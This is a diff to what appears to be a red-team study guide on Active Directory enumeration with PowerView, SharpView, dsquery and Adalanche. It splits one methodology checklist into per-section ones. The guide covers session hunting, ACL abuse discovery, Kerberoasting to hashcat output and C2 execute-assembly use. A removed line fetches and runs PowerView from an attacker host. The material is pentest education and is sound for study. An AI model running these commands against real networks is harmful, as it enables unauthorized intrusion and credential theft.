@@ -325,6 +325,20 @@ Get-NetDomain</code></pre>
 <pre><code class="language-powershell">Get-NetLoggedon
 Get-NetSession</code></pre>
 
+
+<h4 id="cape-powerview-domain-info-methodology">Methodology</h4>
+<ul class="methodology-checklist">
+  <li><input type="checkbox" data-id="cape-powerview-domain-info-wf-0"> Snapshot the current domain, forest, and every DC in one pass:
+    <pre><code class="language-powershell">Get-NetDomain
+Get-NetForest
+Get-NetDomainController</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-domain-info-wf-1"> Enumerate active logon sessions and interactive users on a target host:
+    <pre><code class="language-powershell">Get-NetLoggedon -ComputerName &lt;target&gt;
+Get-NetSession -ComputerName &lt;target&gt;</code></pre>
+  </li>
+</ul>
+
 <h3 id="cape-powerview-domain-extras">2.2.1 More Domain and DC Cmdlets</h3>
 <p>Beyond the basics, PowerView surfaces the domain SID, current password policy, and every DC in the domain in one line each:</p>
 <pre><code class="language-powershell">Get-DomainSID                      # Just the domain SID
@@ -339,6 +353,24 @@ Get-DomainDNSRecord -ZoneName '&lt;domain.local&gt;' | Select-Object name, recor
 <p>File servers are a common target because they carry credential material in configs. PowerView flags any computer with a common file-server role:</p>
 <pre><code class="language-powershell">Get-DomainFileServer</code></pre>
 
+
+<h4 id="cape-powerview-domain-extras-methodology">Methodology</h4>
+<ul class="methodology-checklist">
+  <li><input type="checkbox" data-id="cape-powerview-domain-extras-wf-0"> Pull the domain SID, password policy, and DC list in three commands:
+    <pre><code class="language-powershell">Get-DomainSID
+Get-DomainPolicy
+Get-DomainController</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-domain-extras-wf-1"> Translate SIDs and enumerate DNS zones for a name-based host inventory:
+    <pre><code class="language-powershell">ConvertFrom-SID S-1-5-21-...-500
+Get-DomainDNSZone
+Get-DomainDNSRecord -ZoneName '&lt;domain.local&gt;'</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-domain-extras-wf-2"> List file servers, common credential-material targets:
+    <pre><code class="language-powershell">Get-DomainFileServer</code></pre>
+  </li>
+</ul>
+
 <h3 id="cape-powerview-hunting">2.2.3 Foreign Principals and ACL Hunting</h3>
 <p><code>Find-ForeignGroup</code> and <code>Find-ForeignUser</code> surface principals from a trusted domain that hold membership in the current domain, the corresponding <code>foreignSecurityPrincipal</code> objects and every group that lists them:</p>
 <pre><code class="language-powershell">Find-ForeignGroup                          # Groups in the current domain with members from a trusted one
@@ -347,10 +379,32 @@ Find-ForeignUser                           # Users from a trusted domain with me
 <pre><code class="language-powershell">Find-InterestingDomainAcl -ResolveGUIDs
 Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -eq '&lt;controlled-user&gt;' }</code></pre>
 
+
+<h4 id="cape-powerview-hunting-methodology">Methodology</h4>
+<ul class="methodology-checklist">
+  <li><input type="checkbox" data-id="cape-powerview-hunting-wf-0"> Surface principals from a trusted domain holding rights in the current one:
+    <pre><code class="language-powershell">Find-ForeignGroup
+Find-ForeignUser</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-hunting-wf-1"> Hunt abusable ACEs domain-wide, filtered to the interesting rights:
+    <pre><code class="language-powershell">Find-InterestingDomainAcl -ResolveGUIDs
+Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -eq '&lt;controlled-user&gt;' }</code></pre>
+  </li>
+</ul>
+
 <h3 id="cape-powerview-sharpview">2.2.4 SharpView</h3>
 <p>SharpView is a C# port of PowerView. Same cmdlet names, same outputs, but ships as a single .NET binary that runs under execute-assembly from a C2 (Sliver, Cobalt Strike, Havoc) without dropping PowerShell:</p>
 <pre><code class="language-bash">execute-assembly SharpView.exe Get-DomainUser -Identity &lt;user&gt;
 execute-assembly SharpView.exe Get-DomainComputer -Unconstrained</code></pre>
+
+
+<h4 id="cape-powerview-sharpview-methodology">Methodology</h4>
+<ul class="methodology-checklist">
+  <li><input type="checkbox" data-id="cape-powerview-sharpview-wf-0"> Run PowerView cmdlets through <code>execute-assembly</code> from a C2 without dropping PowerShell:
+    <pre><code class="language-bash">execute-assembly SharpView.exe Get-DomainUser -Identity &lt;user&gt;
+execute-assembly SharpView.exe Get-DomainComputer -Unconstrained</code></pre>
+  </li>
+</ul>
 
 <h3 id="cape-powerview-users-groups">2.3 Users, Groups, and Computers</h3>
 <p>Pull all AD users, users of a specific group, and users matching a filter. <code>Select</code> trims the object to just the fields you want:</p>
@@ -363,6 +417,20 @@ Get-ADUser -Filter * -SearchBase "CN=Users,DC=victim,DC=COM"</code></pre>
 <pre><code class="language-powershell">Get-ADComputer -filter * -properties whencreated | Select Name,@{n="Owner";e={(Get-acl "ad:\$($_.distinguishedname)").owner}},whencreated</code></pre>
 <p>List computers pulled through PowerView instead of the AD module:</p>
 <pre><code class="language-powershell">Get-NetComputer | select name</code></pre>
+
+
+<h4 id="cape-powerview-users-groups-methodology">Methodology</h4>
+<ul class="methodology-checklist">
+  <li><input type="checkbox" data-id="cape-powerview-users-groups-wf-0"> Enumerate every user, or filter by group membership or creation date:
+    <pre><code class="language-powershell">Get-ADUser -Filter *
+Get-ADUser -Filter * -SearchBase "CN=Users,DC=&lt;domain&gt;,DC=&lt;tld&gt;"
+Get-ADUser -Filter {((Enabled -eq $True) -and (Created -gt "Monday, April 10, 2023 00:00:00 AM"))} -Property Created, LastLogonDate | Select SamAccountName, Name, Created</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-users-groups-wf-1"> Enumerate computers with the owner attribute for provenance:
+    <pre><code class="language-powershell">Get-ADComputer -filter * -properties whencreated | Select Name,@{n="Owner";e={(Get-acl "ad:\$($_.distinguishedname)").owner}},whencreated
+Get-NetComputer | select name</code></pre>
+  </li>
+</ul>
 
 <h3 id="cape-powerview-sessions">2.4 Session Hunting and Local Admin Discovery</h3>
 <p>Session hunting is one of the highest-value PowerView primitives. It maps live tokens for privileged accounts to specific hosts, which turns lateral movement into a targeted move rather than a guess. Local admin discovery does the reverse and identifies every host where a given account can already act as admin.</p>
@@ -382,6 +450,22 @@ Get-NetSession -ComputerName &lt;target&gt;
 # Interactive logon users on the target: matches console/RDP sessions
 Get-NetLoggedon -ComputerName &lt;target&gt;</code></pre>
 
+
+<h4 id="cape-powerview-sessions-methodology">Methodology</h4>
+<ul class="methodology-checklist">
+  <li><input type="checkbox" data-id="cape-powerview-sessions-wf-0"> Locate every host with a live session for a specific user or group:
+    <pre><code class="language-powershell">Find-DomainUserLocation -UserIdentity &lt;target-user&gt;
+Find-DomainUserLocation -UserGroupIdentity 'Domain Admins'</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-sessions-wf-1"> Identify every host where the current account already holds local admin rights:
+    <pre><code class="language-powershell">Find-LocalAdminAccess</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-sessions-wf-2"> Direct session and logon queries against a single host:
+    <pre><code class="language-powershell">Get-NetSession -ComputerName &lt;target&gt;
+Get-NetLoggedon -ComputerName &lt;target&gt;</code></pre>
+  </li>
+</ul>
+
 <h3 id="cape-powerview-spns">2.5 SPN and Kerberoasting Enumeration</h3>
 <p>Any authenticated user can request a service ticket for any SPN. The ticket is encrypted with the service account's long-term key, so weak service passwords crack offline. PowerView's <code>-SPN</code> filter returns accounts with any <code>servicePrincipalName</code> populated:</p>
 <pre><code class="language-powershell"># List Kerberoastable users (any user with an SPN set)
@@ -393,6 +477,18 @@ Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Export-Csv .\k
 <pre><code class="language-powershell"># Older one-shot wrapper: same output shape, no separate enumeration step
 Invoke-Kerberoast -OutputFormat Hashcat | Export-Csv .\kerb.csv -NoTypeInformation</code></pre>
 
+
+<h4 id="cape-powerview-spns-methodology">Methodology</h4>
+<ul class="methodology-checklist">
+  <li><input type="checkbox" data-id="cape-powerview-spns-wf-0"> List Kerberoastable accounts (any user with an SPN set):
+    <pre><code class="language-powershell">Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-spns-wf-1"> Roast every Kerberoastable account and write hashcat-ready output:
+    <pre><code class="language-powershell">Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Export-Csv .\kerb.csv -NoTypeInformation
+Invoke-Kerberoast -OutputFormat Hashcat | Export-Csv .\kerb.csv -NoTypeInformation</code></pre>
+  </li>
+</ul>
+
 <h3 id="cape-powerview-asrep">2.6 AS-REP Roasting Enumeration</h3>
 <p>Accounts with pre-authentication disabled leak an AS-REP encrypted with the user's long-term key to any caller. That AS-REP cracks offline. PowerView's <code>-PreauthNotRequired</code> filter narrows to the exact set:</p>
 <pre><code class="language-powershell"># List every account with DONT_REQ_PREAUTH set (bit 4194304 of userAccountControl)
@@ -400,6 +496,17 @@ Get-DomainUser -PreauthNotRequired -Properties samaccountname, distinguishedname
 <p>PowerView does not fetch AS-REPs directly, so pair the list with Impacket's <code>GetNPUsers.py</code> or Rubeus for the actual capture:</p>
 <pre><code class="language-powershell"># Save just the sAMAccountName column to feed GetNPUsers.py or Rubeus asreproast
 Get-DomainUser -PreauthNotRequired | Select-Object -ExpandProperty samaccountname | Out-File .\asrep_users.txt</code></pre>
+
+
+<h4 id="cape-powerview-asrep-methodology">Methodology</h4>
+<ul class="methodology-checklist">
+  <li><input type="checkbox" data-id="cape-powerview-asrep-wf-0"> List accounts with DONT_REQ_PREAUTH set (bit 4194304):
+    <pre><code class="language-powershell">Get-DomainUser -PreauthNotRequired -Properties samaccountname, distinguishedname, useraccountcontrol</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-asrep-wf-1"> Export the user list for GetNPUsers.py or Rubeus asreproast:
+    <pre><code class="language-powershell">Get-DomainUser -PreauthNotRequired | Select-Object -ExpandProperty samaccountname | Out-File .\asrep_users.txt</code></pre>
+  </li>
+</ul>
 
 <h3 id="cape-powerview-delegation">2.7 Delegation Enumeration</h3>
 <p>Delegation misconfigurations are among the fastest privilege escalations on modern domains. PowerView exposes a flag for each of the three variants.</p>
@@ -419,6 +526,21 @@ Get-DomainComputer -TrustedToAuth -Properties samaccountname, msds-allowedtodele
 Get-DomainComputer -Properties samaccountname, msds-allowedtoactonbehalfofotheridentity |
     Where-Object { $_.'msds-allowedtoactonbehalfofotheridentity' }</code></pre>
 
+
+<h4 id="cape-powerview-delegation-methodology">Methodology</h4>
+<ul class="methodology-checklist">
+  <li><input type="checkbox" data-id="cape-powerview-delegation-wf-0"> Enumerate unconstrained delegation on computers (TRUSTED_FOR_DELEGATION):
+    <pre><code class="language-powershell">Get-DomainComputer -Unconstrained -Properties samaccountname, dnshostname, operatingsystem</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-delegation-wf-1"> Enumerate constrained delegation on user and computer accounts:
+    <pre><code class="language-powershell">Get-DomainUser -TrustedToAuth -Properties samaccountname, msds-allowedtodelegateto
+Get-DomainComputer -TrustedToAuth -Properties samaccountname, msds-allowedtodelegateto</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-delegation-wf-2"> Enumerate Resource-Based Constrained Delegation targets:
+    <pre><code class="language-powershell">Get-DomainComputer -Properties samaccountname, msds-allowedtoactonbehalfofotheridentity | Where-Object { $_.'msds-allowedtoactonbehalfofotheridentity' }</code></pre>
+  </li>
+</ul>
+
 <h3 id="cape-powerview-acls">2.8 ACL Enumeration</h3>
 <p>DACLs on AD objects govern which principals can rewrite what attributes, and the interesting ACEs (GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AllExtendedRights) are almost always where the escalations live. <code>Get-DomainObjectAcl -ResolveGUIDs</code> turns the raw ACE data into human-readable rights.</p>
 <p>Every ACE against a specific target:</p>
@@ -437,6 +559,23 @@ Get-DomainObjectAcl -ResolveGUIDs |
 Get-DomainObjectAcl -Identity &lt;target-user&gt; -ResolveGUIDs |
     Where-Object { $_.ObjectAceType -eq 'User-Force-Change-Password' }</code></pre>
 
+
+<h4 id="cape-powerview-acls-methodology">Methodology</h4>
+<ul class="methodology-checklist">
+  <li><input type="checkbox" data-id="cape-powerview-acls-wf-0"> List every ACE currently applied to a target object with rights resolved:
+    <pre><code class="language-powershell">Get-DomainObjectAcl -Identity &lt;target-user&gt; -ResolveGUIDs</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-acls-wf-1"> Surface every principal with a full-control-equivalent ACE domain-wide:
+    <pre><code class="language-powershell">Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner' }</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-acls-wf-2"> Locate ForceChangePassword rights over a specific account:
+    <pre><code class="language-powershell">Get-DomainObjectAcl -Identity &lt;target-user&gt; -ResolveGUIDs | Where-Object { $_.ObjectAceType -eq 'User-Force-Change-Password' }</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-acls-wf-3"> Locate principals that can write <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> (RBCD attack surface):
+    <pre><code class="language-powershell">Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ObjectAceType -eq 'msDS-AllowedToActOnBehalfOfOtherIdentity' }</code></pre>
+  </li>
+</ul>
+
 <h3 id="cape-powerview-trusts">2.9 Trust Enumeration</h3>
 <p>Trust relationships extend the attack surface across a boundary that would otherwise be closed. PowerView surfaces both intra-forest and inter-forest trusts, and its recursive mapping traverses every reachable trust in a single pass.</p>
 <pre><code class="language-powershell"># Trusts DIRECTLY established by the current domain (in/out/bidirectional, transitive or not)
@@ -450,6 +589,21 @@ Get-DomainTrustMapping</code></pre>
 <p>Enumerate users and groups in a trusted domain by passing <code>-Domain</code>:</p>
 <pre><code class="language-powershell"># Query objects in a trusted domain rather than the current one
 Get-DomainUser -Domain &lt;trusted-domain.local&gt; -Properties samaccountname, memberof</code></pre>
+
+
+<h4 id="cape-powerview-trusts-methodology">Methodology</h4>
+<ul class="methodology-checklist">
+  <li><input type="checkbox" data-id="cape-powerview-trusts-wf-0"> Enumerate direct and forest-level trusts from the current domain:
+    <pre><code class="language-powershell">Get-DomainTrust
+Get-ForestTrust</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-trusts-wf-1"> Recursively walk every reachable trust in a single pass:
+    <pre><code class="language-powershell">Get-DomainTrustMapping</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-trusts-wf-2"> Query users or groups inside a trusted domain:
+    <pre><code class="language-powershell">Get-DomainUser -Domain &lt;trusted-domain.local&gt; -Properties samaccountname, memberof</code></pre>
+  </li>
+</ul>
 
 <h3 id="cape-powerview-ou-gpo">2.10 OU and GPO Enumeration</h3>
 <p>GPOs applied at the OU level often carry the interesting settings, including script deployment, restricted group memberships, and local admin assignment. Finding which OU an account sits under tells you which GPOs actually apply to it.</p>
@@ -468,6 +622,24 @@ Get-DomainOU -GPLink &lt;gpo-guid&gt; | Get-DomainComputer</code></pre>
 <p>Find GPOs that assign local admin rights (Restricted Groups policy):</p>
 <pre><code class="language-powershell"># Surfaces GPOs that push local group membership (Administrators, Remote Desktop Users, etc.)
 Get-DomainGPOLocalGroup -Properties GroupName, GPODisplayName</code></pre>
+
+
+<h4 id="cape-powerview-ou-gpo-methodology">Methodology</h4>
+<ul class="methodology-checklist">
+  <li><input type="checkbox" data-id="cape-powerview-ou-gpo-wf-0"> List every OU and inspect the GPOs linked to one:
+    <pre><code class="language-powershell">Get-DomainOU -Properties name, distinguishedname
+Get-DomainOU -Identity &lt;ou-name&gt; | Select-Object -ExpandProperty gplink</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-ou-gpo-wf-1"> List every GPO with its SYSVOL path:
+    <pre><code class="language-powershell">Get-DomainGPO -Properties displayname, gpcfilesyspath</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-ou-gpo-wf-2"> Reverse-lookup computers a specific GPO applies to via its GUID:
+    <pre><code class="language-powershell">Get-DomainOU -GPLink &lt;gpo-guid&gt; | Get-DomainComputer</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-ou-gpo-wf-3"> Surface GPOs that assign local admin rights (Restricted Groups policy):
+    <pre><code class="language-powershell">Get-DomainGPOLocalGroup -Properties GroupName, GPODisplayName</code></pre>
+  </li>
+</ul>
 
 <h3 id="cape-powerview-metasploit">2.11 Metasploit + PowerSploit</h3>
 <p>Metasploit's <code>load powershell</code> extension imports PowerView scripts into a Meterpreter session and executes cmdlets in-memory:</p>
@@ -517,6 +689,17 @@ Foreach ($obj in $Result) {
     Foreach ($prop in $obj.Properties) { $prop }
 }</code></pre>
 
+
+<h4 id="cape-powerview-directorysearcher-methodology">Methodology</h4>
+<ul class="methodology-checklist">
+  <li><input type="checkbox" data-id="cape-powerview-directorysearcher-wf-0"> Fall back to raw .NET when PowerView and RSAT cmdlets are blocked:
+    <pre><code class="language-powershell">$Searcher = New-Object System.DirectoryServices.DirectorySearcher
+$Searcher.filter = "samAccountType=805306368"
+$Result = $Searcher.FindAll()
+Foreach ($obj in $Result) { $obj.Properties.name }</code></pre>
+  </li>
+</ul>
+
 <h3 id="cape-powerview-dsquery">2.13 AD Enumeration with dsquery</h3>
 <p><code>dsquery</code> ships with Windows Server and RSAT and is often present on jump hosts where PowerView isn't. It's noisy but works when other options are gone:</p>
 <pre><code class="language-bash">dsquery user -limit 0
@@ -525,6 +708,15 @@ dsquery group -name "domain admins" | dsget group -members -expand
 dsquery user -name user | dsget user -memberof -expand
 dsquery user -name bob | dsget user -samid
 dsquery user -inactive 3</code></pre>
+
+
+<h4 id="cape-powerview-dsquery-methodology">Methodology</h4>
+<ul class="methodology-checklist">
+  <li><input type="checkbox" data-id="cape-powerview-dsquery-wf-0"> Use dsquery as an off-the-land fallback when PowerShell is locked down:
+    <pre><code class="language-bash">dsquery user -limit 0
+dsquery group "cn=users, dc=&lt;domain&gt;, dc=&lt;tld&gt;"</code></pre>
+  </li>
+</ul>
 
 <h3 id="cape-powerview-adalanche">2.14 Adalanche</h3>
 <p>Adalanche is a modern alternative to BloodHound with strong Kerberos and delegation support. Its web UI leans on a single graph view that groups edges by category, which I sometimes find easier to read than BloodHound's pathfinding for wide-open environments. Collection is a single Go binary invocation:</p>
@@ -540,6 +732,15 @@ dsquery user -inactive 3</code></pre>
 <pre><code class="language-bash">./adalanche analyze
 # then open http://127.0.0.1:8080</code></pre>
 
+
+<h4 id="cape-powerview-adalanche-methodology">Methodology</h4>
+<ul class="methodology-checklist">
+  <li><input type="checkbox" data-id="cape-powerview-adalanche-wf-0"> Collect the AD dataset with Adalanche and browse the resulting graph:
+    <pre><code class="language-bash">adalanche collect activedirectory --domain &lt;domain.local&gt; --username &lt;user&gt; --password '&lt;password&gt;'
+adalanche analyze</code></pre>
+  </li>
+</ul>
+
 <h3 id="cape-powerview-clixml">2.15 Exporting and Reusing Enumerated Objects</h3>
 <p>Freeze the enumeration for offline analysis using PowerShell's XML serialization. <code>Export-Clixml</code> serializes whole objects, properties, methods, everything, to a portable XML file:</p>
 <pre><code class="language-powershell">Get-DomainUser | Export-Clixml .\DomainUsers.xml
@@ -547,101 +748,18 @@ $DomainUsers = Import-Clixml .\DomainUsers.xml
 $DomainUsers | select name
 $DomainUsers | ? {$_.name -match "admin"}</code></pre>
 
-<h4 id="cape-powerview-methodology">Methodology</h4>
+<h4 id="cape-powerview-clixml-methodology">Methodology</h4>
 <ul class="methodology-checklist">
-  <li><input type="checkbox" data-id="cape-powerview-methodology-wf-0"> Load PowerView in-memory via <code>IEX</code> to avoid on-disk artifacts:
-    <pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString('http://&lt;attacker&gt;/PowerView.ps1')</code></pre>
-  </li>
-  <li><input type="checkbox" data-id="cape-powerview-methodology-wf-1"> Snapshot the environment:
-    <pre><code class="language-powershell">Get-NetDomain
-Get-NetDomainController
-Get-NetForest</code></pre>
-  </li>
-  <li><input type="checkbox" data-id="cape-powerview-methodology-wf-2"> Enumerate accounts and groups you're a member of:
-    <pre><code class="language-powershell">Get-ADUser -Filter *
-Get-NetGroup | Where-Object { $_.member -match $env:USERNAME }</code></pre>
-  </li>
-  <li><input type="checkbox" data-id="cape-powerview-methodology-wf-3"> Hunt sessions and locate admins currently logged in:
-    <pre><code class="language-powershell"># SMB sessions on one target host
-Get-NetSession -ComputerName &lt;target&gt;
-
-# Every host with an active session for a member of Domain Admins
-Find-DomainUserLocation -UserGroupIdentity 'Domain Admins'
-
-# Every host where my current credential is already local admin
-Find-LocalAdminAccess</code></pre>
-  </li>
-  <li><input type="checkbox" data-id="cape-powerview-methodology-wf-4"> Enumerate Kerberoastable SPNs and pull tickets directly:
-    <pre><code class="language-powershell"># Enumerate, list every user account with an SPN set
-Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
-
-# Roast, request the TGS for each SPN and write hashcat-ready output
-Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Export-Csv .\kerb.csv -NoTypeInformation
-
-# Older one-shot wrapper for the same enumerate-and-roast flow
-Invoke-Kerberoast -OutputFormat Hashcat | Export-Csv .\kerb.csv -NoTypeInformation</code></pre>
-  </li>
-  <li><input type="checkbox" data-id="cape-powerview-methodology-wf-4a"> Enumerate AS-REP roastable accounts (pre-auth disabled):
-    <pre><code class="language-powershell"># DONT_REQ_PREAUTH bit (4194304) on userAccountControl
-Get-DomainUser -PreauthNotRequired -Properties samaccountname, distinguishedname, useraccountcontrol</code></pre>
-  </li>
-  <li><input type="checkbox" data-id="cape-powerview-methodology-wf-4b"> Map every delegation misconfiguration:
-    <pre><code class="language-powershell"># Unconstrained delegation on computers (TRUSTED_FOR_DELEGATION bit)
-Get-DomainComputer -Unconstrained -Properties samaccountname, dnshostname
-
-# Constrained delegation on user (service) accounts
-Get-DomainUser -TrustedToAuth -Properties samaccountname, msds-allowedtodelegateto
-
-# Constrained delegation on computer accounts
-Get-DomainComputer -TrustedToAuth -Properties samaccountname, msds-allowedtodelegateto
-
-# Resource-based constrained delegation, the target lists who may act on its behalf
-Get-DomainComputer -Properties samaccountname, msds-allowedtoactonbehalfofotheridentity |
-  Where-Object { $_.'msds-allowedtoactonbehalfofotheridentity' }</code></pre>
-  </li>
-  <li><input type="checkbox" data-id="cape-powerview-methodology-wf-4c"> Enumerate ACLs on high-value targets and hunt for abusable ACEs:
-    <pre><code class="language-powershell"># Every ACE against one named target
-Get-DomainObjectAcl -Identity &lt;target-user&gt; -ResolveGUIDs
-
-# Full-control equivalents across the domain (any of the four writeable rights)
-Get-DomainObjectAcl -ResolveGUIDs |
-  Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner' }
-
-# Password-reset rights over any principal (ForceChangePassword)
-Get-DomainObjectAcl -ResolveGUIDs |
-  Where-Object { $_.ObjectAceType -eq 'User-Force-Change-Password' }</code></pre>
-  </li>
-  <li><input type="checkbox" data-id="cape-powerview-methodology-wf-4d"> Walk every reachable trust and enumerate the far side:
-    <pre><code class="language-powershell"># Direct trusts of the current domain
-Get-DomainTrust
-
-# Forest-level trusts (includes cross-forest)
-Get-ForestTrust
-
-# Recursive walk of every reachable trust in one pass
-Get-DomainTrustMapping
-
-# Query users in a trusted domain rather than the current one
-Get-DomainUser -Domain &lt;trusted-domain.local&gt; -Properties samaccountname, memberof</code></pre>
-  </li>
-  <li><input type="checkbox" data-id="cape-powerview-methodology-wf-4e"> Enumerate OUs and their linked GPOs, including any local-admin assignments:
-    <pre><code class="language-powershell"># All OUs, names and distinguished names
-Get-DomainOU -Properties name, distinguishedname
-
-# All GPOs plus their SYSVOL paths (where the actual policy files live)
-Get-DomainGPO -Properties displayname, gpcfilesyspath
-
-# GPOs that push local group membership (Restricted Groups policy)
-Get-DomainGPOLocalGroup -Properties GroupName, GPODisplayName</code></pre>
-  </li>
-  <li><input type="checkbox" data-id="cape-powerview-methodology-wf-5"> Fall back to <code>DirectorySearcher</code> or <code>dsquery</code> when PowerView cmdlets are blocked:
-    <pre><code class="language-bash">dsquery user -limit 0
-dsquery group "cn=users, dc=target, dc=com"</code></pre>
-  </li>
-  <li><input type="checkbox" data-id="cape-powerview-methodology-wf-6"> Export the results with <code>Export-Clixml</code> so subsequent analysis works offline:
+  <li><input type="checkbox" data-id="cape-powerview-clixml-wf-0"> Freeze enumeration output for offline analysis:
     <pre><code class="language-powershell">Get-DomainUser | Export-Clixml .\DomainUsers.xml</code></pre>
   </li>
+  <li><input type="checkbox" data-id="cape-powerview-clixml-wf-1"> Reload later and filter without re-running the query:
+    <pre><code class="language-powershell">$DomainUsers = Import-Clixml .\DomainUsers.xml
+$DomainUsers | select name
+$DomainUsers | ? {$_.name -match "admin"}</code></pre>
+  </li>
 </ul>
+
 <h2 id="cape-bloodhound-3">3. Active Directory BloodHound</h2>
 <p>BloodHound converts the AD relationship graph into something you can actually query. Under the hood it is Neo4j; on top of that sits a client that ships pre-built Cypher queries for the questions attackers actually ask, starting with "what is the shortest path from here to Domain Admin?". That single query has quietly ended more assessments than any zero-day I have ever handled.</p>
 <p>Two collector families exist. SharpHound is the C# implementation for on-premises AD, distributed as an executable with an older PowerShell wrapper. AzureHound covers Entra ID. Both feed the same graph. Most of the operator work happens up front, choosing a collection method the environment's sensors will tolerate, and getting a matching-version collector onto a domain-joined host without lighting up the SOC.</p>
